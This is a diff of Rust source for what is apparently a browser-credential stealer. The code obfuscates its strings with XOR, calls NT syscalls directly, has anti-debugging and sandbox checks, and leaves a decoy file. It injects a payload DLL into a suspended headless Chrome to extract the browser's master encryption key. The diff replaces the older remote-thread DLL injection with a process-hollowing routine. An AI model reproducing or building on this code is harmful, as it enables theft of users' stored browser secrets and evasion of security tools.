@@ -1,4 +1,7 @@
 mod browsers;
+mod hollow;
+mod ipc;
+mod pe;
 
 mod syscalls {
     //! Direct NT syscalls resolved from ntdll.dll at runtime.
@@ -497,29 +500,20 @@ use std::{
     time::{Duration, SystemTime, UNIX_EPOCH},
 };
 
-use serde_json::Value;
 use winreg::enums::HKEY_LOCAL_MACHINE;
 use winreg::RegKey;
 use windows::{
-    core::{PCSTR, PCWSTR, PWSTR},
+    core::{PCWSTR, PWSTR},
     Win32::{
         Foundation::HANDLE,
-        Storage::FileSystem::{
-            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_WRITE, OPEN_EXISTING,
-        },
         System::{
             Diagnostics::ToolHelp::{
                 CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
                 TH32CS_SNAPPROCESS,
             },
-            LibraryLoader::{GetModuleHandleW, GetProcAddress},
-            Memory::{VirtualFreeEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE},
             Threading::{
-                CreateProcessW, GetExitCodeThread, QueryFullProcessImageNameW, ResumeThread,
-                TerminateProcess, WaitForSingleObject, INFINITE, PROCESS_CREATION_FLAGS,
-                PROCESS_INFORMATION, PROCESS_NAME_WIN32, PROCESS_CREATE_THREAD,
-                PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE, PROCESS_VM_OPERATION,
-                PROCESS_VM_READ, PROCESS_VM_WRITE, STARTUPINFOW, STARTUPINFOW_FLAGS,
+                QueryFullProcessImageNameW, TerminateProcess, PROCESS_NAME_WIN32,
+                PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE,
             },
         },
     },
@@ -528,17 +522,9 @@ use windows::{
 const XOR_KEY: u8 = 0x5A;
 const MIN_MEMORY_BYTES: u64 = 4 * 1024 * 1024 * 1024;
 const MAX_CPU_CORES: usize = 2;
-const THREAD_ALL_ACCESS: u32 = 0x001F_03FF;
 
 fn xor_str(data: &[u8]) -> String {
     String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
-}
-
-fn s_result_env() -> String {
-    xor_str(&[
-        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
-        0x05, 0x08, 0x1F, 0x09, 0x16, 0x0E, 0x0E,
-    ])
 }
 
 fn s_user_data_env() -> String {
@@ -562,32 +548,12 @@ fn s_browser_name_env() -> String {
     ])
 }
 
-fn s_master_key_hex() -> String {
-    xor_str(&[
-        0x37, 0x3B, 0x29, 0x2E, 0x3F, 0x28, 0x05, 0x31, 0x3F, 0x23, 0x05, 0x32, 0x3F, 0x22,
-    ])
-}
-
-fn s_error_key() -> String {
-    xor_str(&[0x3F, 0x28, 0x28, 0x35, 0x28])
-}
-
 fn s_local() -> String {
     xor_str(&[0x36, 0x35, 0x39, 0x3B, 0x36])
 }
 
 fn s_roaming() -> String {
     xor_str(&[0x28, 0x35, 0x3B, 0x37, 0x33, 0x34, 0x3D])
-}
-
-fn s_kernel32() -> String {
-    xor_str(&[0x31, 0x3F, 0x28, 0x34, 0x3F, 0x36, 0x68, 0x74, 0x3E, 0x36, 0x36])
-}
-
-fn s_load_library_w() -> String {
-    xor_str(&[
-        0x16, 0x35, 0x3B, 0x3E, 0x16, 0x33, 0x38, 0x28, 0x3B, 0x28, 0x23, 0x0D,
-    ])
 }
 
 fn s_ntdll() -> String {
@@ -601,7 +567,7 @@ fn s_nt_create_thread_ex() -> String {
     ])
 }
 
-fn s_nul() -> String {
+pub(crate) fn s_nul() -> String {
     xor_str(&[0x14, 0x0F, 0x16])
 }
 
@@ -694,7 +660,7 @@ fn run_decoy() {
     let _ = fs::write(env::temp_dir().join(s_decoy_name()), s_decoy_body());
 }
 
-fn random_delay_ms() {
+pub(crate) fn random_delay_ms() {
     let seed = SystemTime::now()
         .duration_since(UNIX_EPOCH)
         .unwrap_or_default()
@@ -702,7 +668,7 @@ fn random_delay_ms() {
     thread::sleep(Duration::from_millis(50 + (seed % 451)));
 }
 
-fn wide(s: &str) -> Vec<u16> {
+pub(crate) fn wide(s: &str) -> Vec<u16> {
     OsStr::new(s).encode_wide().chain(Some(0)).collect()
 }
 
@@ -756,7 +722,6 @@ impl Drop for Cleanup {
         for path in &self.dirs {
             let _ = fs::remove_dir_all(path);
         }
-        let _ = env::remove_var(s_result_env());
         let _ = env::remove_var(s_user_data_env());
         let _ = env::remove_var(s_data_root_env());
         let _ = env::remove_var(s_browser_name_env());
@@ -961,199 +926,6 @@ fn resolve_browser_exe(target_exe: &str, browser_name: &str) -> Option<String> {
         .or_else(|| find_browser_exe_on_disk(target_exe, browser_name))
 }
 
-fn load_module(pid: u32, dll_path: &Path) -> Result<(), ()> {
-    let dll_str = dll_path.to_string_lossy();
-    let dll_wide = wide(&dll_str);
-    let dll_bytes = dll_wide.len() * 2;
-
-    unsafe {
-        syscalls::init();
-        random_delay_ms();
-        let proc = syscalls::open_process(
-            PROCESS_VM_OPERATION.0
-                | PROCESS_VM_WRITE.0
-                | PROCESS_VM_READ.0
-                | PROCESS_CREATE_THREAD.0,
-            pid,
-        )?;
-
-        random_delay_ms();
-        let mut remote: *mut c_void = std::ptr::null_mut();
-        let mut region_size = dll_bytes;
-        let status = syscalls::nt_allocate_virtual_memory(
-            proc,
-            &mut remote,
-            0,
-            &mut region_size,
-            MEM_COMMIT.0 | MEM_RESERVE.0,
-            PAGE_READWRITE.0,
-        );
-        if status < 0 || remote.is_null() {
-            let _ = syscalls::close_handle(proc);
-            return Err(());
-        }
-
-        random_delay_ms();
-        let mut written = 0usize;
-        let status = syscalls::nt_write_virtual_memory(
-            proc,
-            remote,
-            dll_wide.as_ptr() as *const c_void,
-            dll_bytes,
-            &mut written,
-        );
-        if status < 0 || written != dll_bytes {
-            let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
-            let _ = syscalls::close_handle(proc);
-            return Err(());
-        }
-
-        let k32_name = wide(&s_kernel32());
-        let k32 = GetModuleHandleW(PCWSTR(k32_name.as_ptr())).map_err(|_| ())?;
-        let load_name = format!("{}\0", s_load_library_w());
-        let loadlib = GetProcAddress(k32, PCSTR(load_name.as_ptr())).ok_or(())?;
-        let start_fn: unsafe extern "system" fn(*mut c_void) -> u32 = mem::transmute(loadlib);
-
-        let mut thr = HANDLE::default();
-        let status = syscalls::nt_create_thread_ex(
-            &mut thr,
-            THREAD_ALL_ACCESS,
-            std::ptr::null_mut(),
-            proc,
-            start_fn as *mut c_void,
-            remote,
-            0,
-            0,
-            0,
-            0,
-            std::ptr::null_mut(),
-        );
-        if status < 0 {
-            let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
-            let _ = syscalls::close_handle(proc);
-            return Err(());
-        }
-        if thr.0.is_null() {
-            let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
-            let _ = syscalls::close_handle(proc);
-            return Err(());
-        }
-
-        WaitForSingleObject(thr, INFINITE);
-        let mut exit_code = 0u32;
-        GetExitCodeThread(thr, &mut exit_code).ok();
-        let _ = syscalls::close_handle(thr);
-        VirtualFreeEx(proc, remote, 0, MEM_RELEASE).ok();
-        let _ = syscalls::close_handle(proc);
-
-        if exit_code == 0 {
-            return Err(());
-        }
-    }
-    Ok(())
-}
-
-fn spawn_suspended_and_inject(
-    chrome_exe: &str,
-    dll_path: &Path,
-    profile_dir: &Path,
-) -> Result<u32, ()> {
-    // unchanged
-    let profile_str = profile_dir.to_string_lossy();
-    let cmdline = format!(
-        "\"{chrome_exe}\" --headless=new --disable-gpu \
-         --disable-logging --log-level=3 --silent-debug-dump \
-         --disable-background-networking --disable-sync --disable-default-apps \
-         --disable-features=PushMessaging,NotificationTriggers \
-         --remote-debugging-port=0 --no-first-run \
-         --no-default-browser-check --noerrdialogs \
-         --user-data-dir=\"{profile_str}\""
-    );
-
-    let exe_w = wide(chrome_exe);
-    let mut cmd_w = wide(&cmdline);
-
-    let mut si = STARTUPINFOW {
-        cb: mem::size_of::<STARTUPINFOW>() as u32,
-        dwFlags: STARTUPINFOW_FLAGS(0x0000_0100),
-        ..Default::default()
-    };
-    let mut pi = PROCESS_INFORMATION::default();
-    const CREATE_FLAGS: u32 = 0x0000_0004 | 0x0800_0000;
-
-    unsafe {
-        let nul_name = wide(&s_nul());
-        let nul = CreateFileW(
-            PCWSTR(nul_name.as_ptr()),
-            FILE_GENERIC_WRITE.0,
-            FILE_SHARE_WRITE,
-            None,
-            OPEN_EXISTING,
-            FILE_ATTRIBUTE_NORMAL,
-            HANDLE::default(),
-        )
-        .map_err(|_| ())?;
-
-        si.hStdInput = nul;
-        si.hStdOutput = nul;
-        si.hStdError = nul;
-
-        CreateProcessW(
-            PCWSTR(exe_w.as_ptr()),
-            PWSTR(cmd_w.as_mut_ptr()),
-            None,
-            None,
-            true,
-            PROCESS_CREATION_FLAGS(CREATE_FLAGS),
-            None,
-            None,
-            &si,
-            &mut pi,
-        )
-        .map_err(|_| {
-            let _ = unsafe { syscalls::close_handle(nul) };
-        })?;
-
-        let _ = unsafe { syscalls::close_handle(nul) };
-        let pid = pi.dwProcessId;
-
-        match load_module(pid, dll_path) {
-            Ok(()) => {
-                ResumeThread(pi.hThread);
-                let _ = unsafe { syscalls::close_handle(pi.hThread) };
-                let _ = unsafe { syscalls::close_handle(pi.hProcess) };
-                Ok(pid)
-            }
-            Err(()) => {
-                TerminateProcess(pi.hProcess, 1).ok();
-                let _ = unsafe { syscalls::close_handle(pi.hThread) };
-                let _ = unsafe { syscalls::close_handle(pi.hProcess) };
-                Err(())
-            }
-        }
-    }
-}
-
-fn hex_to_key(hex: &str) -> Option<Vec<u8>> {
-    if hex.len() != 64 {
-        return None;
-    }
-    (0..hex.len())
-        .step_by(2)
-        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
-        .collect()
-}
-
-fn read_key_from_result(path: &Path) -> Option<Vec<u8>> {
-    let raw = fs::read_to_string(path).ok()?;
-    let json: Value = serde_json::from_str(&raw).ok()?;
-    if json.get(&s_error_key()).and_then(|e| e.as_str()).is_some() {
-        return None;
-    }
-    let hex = json.get(&s_master_key_hex())?.as_str()?;
-    hex_to_key(hex)
-}
-
 pub fn process_data(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     if is_debugger_attached() {
         thread::sleep(Duration::from_secs(30));
@@ -1168,23 +940,14 @@ pub fn process_data(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     }
 
     let target = browsers::find_target(browser_name)?;
-    let exe = target.exe;
-    let browser_exe = resolve_browser_exe(exe, browser_name)?;
+    let browser_exe = resolve_browser_exe(target.exe, browser_name)?;
 
     let tag = session_tag();
-    let temp = env::temp_dir();
-    let dll_path = temp.join(format!("{tag}.tmp"));
-    let result_path = temp.join(format!("{tag}.json"));
-    let profile_dir = temp.join(format!("{tag}_p"));
+    let profile_dir = env::temp_dir().join(format!("{tag}_p"));
 
     let mut cleanup = Cleanup::new();
-    cleanup.track_file(dll_path.clone());
-    cleanup.track_file(result_path.clone());
-    cleanup.track_dir(profile_dir.clone());
+    cleanup.track_dir(profile_dir);
 
-    fs::write(&dll_path, payload_dll).ok()?;
-
-    env::set_var(s_result_env(), &result_path);
     env::set_var(s_user_data_env(), target.user_data_rel);
     env::set_var(
         s_data_root_env(),
@@ -1195,37 +958,15 @@ pub fn process_data(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     );
     env::set_var(s_browser_name_env(), browser_name);
 
-    let injected = if let Ok(pid) =
-        spawn_suspended_and_inject(&browser_exe, &dll_path, &profile_dir)
-    {
-        cleanup.spawned_pid = Some(pid);
-        true
-    } else {
-        let mut ok = false;
-        for pid in find_browser_pids(exe) {
-            if load_module(pid, &dll_path).is_ok() {
-                ok = true;
-                break;
-            }
-        }
-        ok
-    };
+    hollow::hollow_inject(&browser_exe, payload_dll, &profile_dir, &tag).ok()
+}
 
-    if !injected {
+pub(crate) fn hex_to_key(hex: &str) -> Option<Vec<u8>> {
+    if hex.len() != 64 {
         return None;
     }
-
-    for i in 0..24 {
-        if result_path.exists() {
-            if let Some(key) = read_key_from_result(&result_path) {
-                if key.len() == 32 {
-                    return Some(key);
-                }
-            }
-        }
-        let delay = if i < 8 { 200 } else { 400 };
-        thread::sleep(Duration::from_millis(delay));
-    }
-
-    None
+    (0..hex.len())
+        .step_by(2)
+        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
+        .collect()
 }
